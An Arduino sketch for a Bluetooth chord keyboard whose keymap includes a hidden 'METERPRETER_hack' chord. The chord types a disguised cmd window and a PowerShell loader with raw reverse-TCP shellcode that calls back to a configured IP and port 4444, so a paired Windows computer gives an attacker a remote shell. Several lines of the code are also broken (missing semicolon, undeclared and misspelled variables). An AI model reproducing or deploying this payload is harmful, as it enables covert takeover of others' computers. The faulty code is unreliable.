/*
 * Arduino code for a Bluetooth version of the Chorder.
 * @author: clc@clcworld.net
 * additional code by: priestdo@budgardr.org
 * This version tested on/with the Adafruit Feather 32u4 Bluefruit LE
 *
 * It is a new arduino based chorder inspired by the SpiffChorder 
 * which can be found at http://symlink.dk/projects/spiffchorder/ 
 */

#include <Arduino.h>
#include <SPI.h>
#if not defined (_VARIANT_ARDUINO_DUE_X_)
#include <SoftwareSerial.h>
#endif

#include "Adafruit_BLE.h"
#include "Adafruit_BluefruitLE_SPI.h"
#include "Adafruit_BluefruitLE_UART.h"

#include "BluefruitConfig.h"
#include "KeyCodes.h"
#include "ChordMappings.h"
#include "ShellcodeFunctions.h"

/*========================================================================
    APPLICATION SETTINGS

    FACTORYRESET_ENABLE       Perform a factory reset when running this sketch
   
                              Enabling this will put your Bluefruit LE module
                              in a 'known good' state and clear any config
                              data set in previous sketches or projects, so
                              running this at least once is a good idea.
   
                              When deploying your project, however, you will
                              want to disable factory reset by setting this
                              value to 0.  If you are making changes to your
                              Bluefruit LE device via AT commands, and those
                              changes aren't persisting across resets, this
                              is the reason why.  Factory reset will erase
                              the non-volatile memory where config data is
                              stored, setting it back to factory default
                              values.
       
                              Some sketches that require you to bond to a
                              central device (HID mouse, keyboard, etc.)
                              won't work at all with this feature enabled
                              since the factory reset will clear all of the
                              bonding data stored on the chip, meaning the
                              central device won't be able to reconnect.
    MINIMUM_FIRMWARE_VERSION  Minimum firmware version to have some new features
    -----------------------------------------------------------------------*/
    #define FACTORYRESET_ENABLE         0
    #define MINIMUM_FIRMWARE_VERSION    "0.6.6"
/*=========================================================================*/

// Create the bluefruit object, either software serial...uncomment these lines
/*
SoftwareSerial bluefruitSS = SoftwareSerial(BLUEFRUIT_SWUART_TXD_PIN, BLUEFRUIT_SWUART_RXD_PIN);

Adafruit_BluefruitLE_UART ble(bluefruitSS, BLUEFRUIT_UART_MODE_PIN,
                      BLUEFRUIT_UART_CTS_PIN, BLUEFRUIT_UART_RTS_PIN);
*/

/* ...or hardware serial, which does not need the RTS/CTS pins. Uncomment this line */
// Adafruit_BluefruitLE_UART ble(BLUEFRUIT_HWSERIAL_NAME, BLUEFRUIT_UART_MODE_PIN);

/* ...hardware SPI, using SCK/MOSI/MISO hardware SPI pins and then user selected CS/IRQ/RST */
Adafruit_BluefruitLE_SPI ble(BLUEFRUIT_SPI_CS, BLUEFRUIT_SPI_IRQ, BLUEFRUIT_SPI_RST);

/* ...software SPI, using SCK/MOSI/MISO user-defined SPI pins and then user selected CS/IRQ/RST */
//Adafruit_BluefruitLE_SPI ble(BLUEFRUIT_SPI_SCK, BLUEFRUIT_SPI_MISO,
//                             BLUEFRUIT_SPI_MOSI, BLUEFRUIT_SPI_CS,
//                             BLUEFRUIT_SPI_IRQ, BLUEFRUIT_SPI_RST);


int ip[] = {192,168,1,1}; // The IP address for Reverse_TCP connection
int port = 4444; // The port - outward facing port, not internal port.

char net_info[] = "0x@@,0x@@,0x@@,0x@@,0x68,0x02,0x00,0x@@,0x@@,0x89,";


// A small helper
void error(const __FlashStringHelper*err) {
  Serial.println(err);
  while (1);
}

// moved to KeyCodes.h

// moved to ChordMappings.h

void parseNet()
{
    char hex[16] = {'0','1','2','3',
                    '4','5','6','7',
                    '8','9','a','b',
                    'c','d','e','f'};
    int i;
    for (i = 0; i < 4; ++i) {
        net_info[(i*5)+2] = hex[ip[i]/16]; // Turn the parts of the IP address into hex and insert them into 
        net_info[(i*5)+3] = hex[ip[i]%16]; // the network info portion of the shellcode
    }
    net_info[37] = hex[(port / 256) / 16]; // Do the same, but for the port
    net_info[38] = hex[(port / 256) % 16];
    net_info[42] = hex[(port % 256) / 16];
    net_info[43] = hex[(port % 256) % 16];
}


class Button {
  byte _pin;  // The button's I/O pin, as an Arduino pin number.
  
public:
  Button(byte pin) : _pin(pin) {
    pinMode(pin, INPUT_PULLUP);      // Make pin an input and activate pullup.
  }
  
  bool isDown() const {
    // TODO: this assumes we're using analog pins!
    //return analogRead(_pin) < 0x100;
    return (digitalRead(_pin) == LOW);
  }
};

// power regulator enabale control pin
const int EnPin =  5;

// Pin numbers for the keyboard switches, using the Arduino numbering.
static const Button switch_pins[7] = {
  Button(6),  // Pinky
  Button(A5),  // Ring
  Button(A4),  // Middle
  Button(A3),  // Index
  Button(A2),  // Near Thumb
  Button(A1),  // Center Thumb
  Button(A0),  // Far Thumb
};

void setup(void)
{
  // Ensure software power reset pin in high
   pinMode(EnPin, OUTPUT);      // Make pin an output,
   digitalWrite(EnPin, HIGH);  // and activate pullup.
  //while (!Serial);  // Required for Flora & Micro
  delay(500);
  parseNet()
  Serial.begin(115200);
  Serial.println(F("Adafruit Bluefruit HID Chorder"));
  Serial.println(F("---------------------------------------"));

  /* Initialise the module */
  Serial.print(F("Initialising the Bluefruit LE module: "));

  if ( !ble.begin(VERBOSE_MODE) )
  {
    error(F("Couldn't find Bluefruit, make sure it's in CoMmanD mode & check wiring?"));
  }
  Serial.println( F("OK!") );

  if ( FACTORYRESET_ENABLE )
  {
    /* Perform a factory reset to make sure everything is in a known state */
    Serial.println(F("Performing a factory reset: "));
    if ( ! ble.factoryReset() ){
      error(F("Factory reset failed!"));
    }
  }

  /* Disable command echo from Bluefruit */
  ble.echo(false);

  Serial.println("Requesting Bluefruit info:");
  /* Print Bluefruit information */
  ble.info();

  // This demo only works with firmware 0.6.6 and higher!
  // Request the Bluefruit firmware rev and check if it is valid
  if ( !ble.isVersionAtLeast(MINIMUM_FIRMWARE_VERSION) )
  {
    error(F("This sketch requires firmware version " MINIMUM_FIRMWARE_VERSION " or higher!"));
  }

  /* Enable HID Service */
  Serial.println(F("Enable HID Services (including Control Key): "));
  if (! ble.sendCommandCheckOK(F( "AT+BleKeyboardEn=On"  ))) {
    error(F("Failed to enable HID (firmware >=0.6.6?)"));
  }

  /* Adding or removing services requires a reset */
  Serial.println(F("Performing a SW reset (service changes require a reset): "));
  if (! ble.reset() ) {
    error(F("Couldn't reset??"));
  }


  String stringOne =  String(0x45, HEX);
  
  Serial.println(stringOne);
}


enum State {
  PRESSING,
  RELEASING,
};

State state = RELEASING;
byte lastKeyState = 0;

enum Mode {
  ALPHA,
  NUMSYM,
  FUNCTION
};

bool isCapsLocked = false;
bool isNumsymLocked = false;
keymap_t modKeys = 0x00;

Mode mode = ALPHA;

void send(char* character) {
//  Uart.print(character);
}

void sendKey(byte keyState){
  keymap_t theKey;  
  // Determine the key based on the current mode's keymap
  if (mode == ALPHA) {
    theKey = keymap_default[keyState];
  } else if (mode == NUMSYM) {
    theKey = keymap_numsym[keyState];
  } else {
    theKey = keymap_function[keyState];
  }

  switch (theKey)  {
  // Handle mode switching - return immediately after the mode has changed
  // Handle basic mode switching
  case MODE_NUM:
    if (mode == NUMSYM) {
      mode = ALPHA;
    } else {
      mode = NUMSYM;
    }
    return;
  case MODE_FUNC:
    if (mode == FUNCTION) {
      mode = ALPHA;
    } else {
      mode = FUNCTION;
    }
    return;
  case MODE_RESET:
    mode = ALPHA;
    modKeys = 0x00;
    isCapsLocked = false;
    isNumsymLocked = false;
    return;
  case MODE_MRESET:
    mode = ALPHA;
    modKeys = 0x00;
    isCapsLocked = false;
    isNumsymLocked = false;       
    digitalWrite(EnPin, LOW);  // turn off 3.3v regulator enable.
    return;
  // Handle mode locks
  case ENUMKEY_cpslck:
    if (isCapsLocked){
      isCapsLocked = false;
      modKeys = 0x00;
    } else {
      isCapsLocked = true;
      modKeys = 0x02;
    }
    return;
  case MODE_NUMLCK:
    if (isNumsymLocked){
      isNumsymLocked = false;
      mode = ALPHA;
    } else {
      isNumsymLocked = true;
      mode = NUMSYM;
    }
    return;
  // Handle modifier keys toggling
  case MOD_LCTRL:
    modKeys = modKeys ^ 0x01;
    return;
  case MOD_LSHIFT:
    modKeys = modKeys ^ 0x02;
    return;
  case MOD_LALT:
    modKeys = modKeys ^ 0x04;
    return;
  case MOD_LGUI:
    modKeys = modKeys ^ 0x08;
    return;
  case MOD_RCTRL:
    modKeys = modKeys ^ 0x10;
    return;
  case MOD_RSHIFT:
    modKeys = modKeys ^ 0x20;
    return;
  case MOD_RALT:
    modKeys = modKeys ^ 0x40;
    return;
  case MOD_RGUI:
    modKeys = modKeys ^ 0x80;
    return;
  // Handle special keys
  case MULTI_NumShift:
    if (mode == NUMSYM) {
      mode = ALPHA;
    } else {
      mode = NUMSYM;
    }
    modKeys = modKeys ^ 0x02;
    return;
  case MULTI_CtlAlt:
    modKeys = modKeys ^ 0x01;
    modKeys = modKeys ^ 0x04;
    return;
  /* Everything after this sends actual keys to the system; break rather than
     return since we want to reset the modifiers after these keys are sent. */
  case MACRO_000:
    sendRawKey(0x00, 0x27);
    sendRawKey(0x00, 0x27);
    sendRawKey(0x00, 0x27);
    break;
  case MACRO_00:
    sendRawKey(0x00, 0x27);
    sendRawKey(0x00, 0x27);
    break;
  case MACRO_quotes:
    sendRawKey(0x02, 0x34);
    sendRawKey(0x02, 0x34);
    sendRawKey(0x00, 0x50);
    break;
  case MACRO_parens:
    sendRawKey(0x02, 0x26);
    sendRawKey(0x02, 0x27);
    sendRawKey(0x00, 0x50);
    break;
  case MACRO_dollar:
    sendRawKey(0x02, 0x21);
    break;
  case MACRO_percent:
    sendRawKey(0x02, 0x22);
    break;
  case MACRO_ampersand:
    sendRawKey(0x02, 0x24);
    break;
  case MACRO_asterisk:
    sendRawKey(0x02, 0x25);
    break;
  case MACRO_question:
    sendRawKey(0x02, 0x38);
    break;
  case MACRO_plus:
    sendRawKey(0x02, 0x2E);
    break;
  case MACRO_openparen:
    sendRawKey(0x02, 0x26);
    break;
  case MACRO_closeparen:
    sendRawKey(0x02, 0x27);
    break;
  case MACRO_opencurly:
    sendRawKey(0x02, 0x2F);
    break;
  case MACRO_closecurly:
    sendRawKey(0x02, 0x30);
    break;
  // Handle Android specific keys
  case ANDROID_search:
    sendRawKey(0x04, 0x2C);
    break;
  case ANDROID_home:
    sendRawKey(0x04, 0x29);
    break;
  case ANDROID_menu:
    sendRawKey(0x10, 0x29);
    break;
  case ANDROID_back:
    sendRawKey(0x00, 0x29);
    break;
  case ANDROID_dpadcenter:
    sendRawKey(0x00, 0x5D);
    break;
  // Handle the opening and attachment of meterpreter shells (ONLY WORKS ON WINDOWS!)
  case METERPRETER_hack:
    openCmdPrompt(); 
    delay(2500);
    attachMeterpreter();
    break;
  case MEDIA_playpause:
    sendControlKey("PLAYPAUSE");
    break;
  case MEDIA_stop:
    sendControlKey("MEDIASTOP");
    break;
  case MEDIA_next:
    sendControlKey("MEDIANEXT");
    break;
  case MEDIA_previous:
    sendControlKey("MEDIAPREVIOUS");
    break;
  case MEDIA_volup:
    sendControlKey("VOLUME+,500");
    break;
  case MEDIA_voldn:
    sendControlKey("VOLUME-,500");
    break;
  // Send the key
  default:
    sendRawKey(modKeys, theKey);
    break;
  }

  modKeys = 0x00;
  mode = ALPHA;
  // Reset the modKeys and mode based on locks
  if (isCapsLocked){
    modKeys = 0x02;
  }
  if (isNumsymLocked){
    mode = NUMSYM;
  }
}
void openCmdPrompt(){
    sendRawKey(0x80, 0x15); //Open the run menu (Windowskey-R)
    delay(500); // A little bit of delay to allow the RUN menu to open
    
    /* Next we bring up the cmd window with the minimum size and contrast as low as we can possibly make it
       This combined with the speed of the character entry makes it virtually impossible to figure out
       what we are doing to the target computer. */
    
    sendString("cmd.exe /T:01 /K MODE CON: COLS=17 LINES=1"); // This is really useful for HID exploitation                           
    
    sendRawKey(0x00, 0x28); // Sends the enter key to bring up the specified cmd window.
}

void attachMeterpreter(){
    // Set the path for powershell-based code execution
    sendString("if exist C:\\Windows\\SysWOW64 ( set PWRSHLXDD=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell) else ( set PWRSHLXDD=powershell )");
    sendRawKey(0x00, 0x28); //Send the enter key
    delay(500);
    
    // Actually enter the shellcode
    sendString("%PWRSHLXDD% -nop -w hidden -c \"$1 = '$c = ''");
    sendString("[DllImport(\\\"kernel32.dll\\\")]public static ext");
    sendString("ern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwS");
    sendString("ize, uint flAllocationType, uint flProtect);[DllIm");
    sendString("port(\\\"kernel32.dll\\\")]public static extern In");
    sendString("tPtr CreateThread(IntPtr lpThreadAttributes, uint ");
    sendString("dwStackSize, IntPtr lpStartAddress, IntPtr lpParam");
    sendString("eter, uint dwCreationFlags, IntPtr lpThreadId);[Dl");
    sendString("lImport(\\\"msvcrt.dll\\\")]public static extern I");
    sendString("ntPtr memset(IntPtr dest, uint src, uint count);''");
    sendString(";$w = Add-Type -memberDefinition $c -Name \\\"Win3");
    sendString("2\\\" -namespace Win32Functions -passthru;[Byte[]]");
    sendString(";[Byte[]]$sc = ");
    sendString("0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,");
    sendString("0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,");
    sendString("0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,");
    sendString("0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,");
    sendString("0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,");
    sendString("0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,");
    sendString("0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,");
    sendString("0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,");
    sendString("0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,");
    sendString("0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,");
    sendString("0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,");
    sendString("0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,");
    sendString("0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,");
    sendString("0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,");
    sendString("0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,");
    sendString("0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,");
    sendString("0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,");
    sendString("0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,");
    sendString("0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,");
    sendString("0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,");
    sendString(net_info);  // Print out required network information.
    sendString("0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,");
    sendString("0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,");
    sendString("0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,");
    sendString("0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,");
    sendString("0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,");
    sendString("0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,");
    sendString("0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,");
    sendString("0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,");
    sendString("0x75,0xec,0xc3;");
    sendString("$size = 0x1000;if ($sc.Length -gt 0");
    sendString("x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0");
    sendString("x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);");
    sendString("$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$");
    sendString("i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){St");
    sendString("art-sleep 60};';$gq = [System.Convert]::ToBase64St");
    sendString("ring([System.Text.Encoding]::Unicode.GetBytes($1))");
    sendString(";if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot +");
    sendString(" \\\"\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\");
    sendString("powershell\\\";$cmd = \\\"-nop -noni -enc \\\";iex");
    sendString(" \\\" $x86 $cmd $gq\\\"}else{$cmd = \\\"-nop -noni");
    sendString(" -enc\\\";iex \\\" powershell $cmd $gq\\\";}\"");
    delay(500);
    /****************
    *    PWN IT!   *
    ****************/
    
    sendRawKey(0x00, 0x28); // Enter key again, this time it runs the shellcode and PWNs the computer.
    delay(500);
}
void sendRawKey(char modKey, char rawKey){
    // Format for Bluefruit Feather is MOD-00-KEY.
    String keys = String(modKey, HEX) + "-00-" + String(rawKey, HEX);
    
    ble.print("AT+BLEKEYBOARDCODE=");
    ble.println(keys);
    // Must send this to release the keys.
    ble.println("AT+BLEKEYBOARDCODE=00-00");
}

void sendString(String commandstring){
    uint16_t length = sizeof(commandstring) / sizeof(commandstring[0]); // Find the size of the string to be sent
    uint16_t lengthOfAsciiSet = sizeof(asciicodemappings) / sizeof(asciicodemappings[0]); //Get the size of the ASCII code mappings tables
    for(i = 0; i <= length; i++) { // Iterate through each character of the input string
        char charToSend = commandstring[i]; // Save the character that should be sent
        uint8_t asciiIndex = 0; // For each iteration, we need to loop through the ASCII table and find out what index the character we need to send is at
        while(asciiIndex <= lengthOfAsciiSet && asciicodemappings[asciiIndex] != charToSend) { // Actually looping through
            asciiindex++;
        }
        sendRawKey(asciimodifiermappings[asciiIndex], asciikeycodemaps[asciiIndex]); // Send the correct key with the correct modifiers. 
    }
}
    
    
void sendControlKey(String cntrlName){
  // note: for Volume +/- and the few other keys that take a time to hold, simply add it into the string
  // for example:
  //    sendControlKey("VOLUME+,500")
  // will send Volume up and hold it for half a second
  ble.print("AT+BLEHIDCONTROLKEY=");
  ble.println(cntrlName);  
}  
byte previousStableReading = 0;
byte currentStableReading = 0;
long lastDebounceTime = 0;  // the last time the output pin was toggled
long debounceDelay = 10;    // the debounce time; increase if the output flickers

void processReading(){
    switch (state) {
    case PRESSING:
      if (previousStableReading & ~currentStableReading) {
        state = RELEASING;
        sendKey(previousStableReading);
      } 
      break;

    case RELEASING:
      if (currentStableReading & ~previousStableReading) {
        state = PRESSING;
      }
      break;
    }
}

void loop() {
  // Build the current key state.
  byte keyState = 0, mask = 1;
  for (int i = 0; i < 7; i++) {
    if (switch_pins[i].isDown()) keyState |= mask;
    mask <<= 1;
  }

  if (lastKeyState != keyState) {
    lastDebounceTime = millis();
  }

  if ((millis() - lastDebounceTime) > debounceDelay) {
    // whatever the reading is at, it's been there for longer
    // than the debounce delay, so take it as the actual current state:
    currentStableReading = keyState;
  }

  if (previousStableReading != currentStableReading) {
    processReading();
    previousStableReading = currentStableReading;
  }

  lastKeyState = keyState;
}
